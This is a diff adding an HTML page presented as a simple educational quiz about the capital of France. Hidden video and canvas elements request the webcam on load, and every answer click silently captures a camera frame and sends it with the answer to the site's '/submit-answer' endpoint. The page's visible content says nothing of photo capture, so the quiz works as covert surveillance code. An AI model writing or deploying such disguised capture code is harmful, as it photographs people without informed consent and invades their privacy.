@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Quick Quiz</title>
+</head>
+<body>
+    <h1>Educational Quiz</h1>
+    <p>Question 1: What is the capital of France?</p>
+    
+    <!-- Quiz Buttons -->
+    <button onclick="submitAnswer('London')">London</button>
+    <button onclick="submitAnswer('Paris')">Paris</button>
+
+    <!-- Hidden Video and Canvas Elements -->
+    <video id="webcam" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Request camera access immediately when the page loads
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => console.error("Camera permission denied.", err));
+
+        // Function that runs when a user clicks an answer
+        function submitAnswer(answerText) {
+            // 1. Draw the current video frame onto the hidden canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // 2. Convert the canvas picture into data
+            const imageData = canvas.toDataURL('image/png');
+
+            // 3. Send the answer and the image to our server
+            fetch('/submit-answer', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    answer: answerText,
+                    image: imageData
+                })
+            })
+            .then(response => response.json())
+            .then(data => alert(data.message));
+        }
+    </script>
+</body>
+</html>
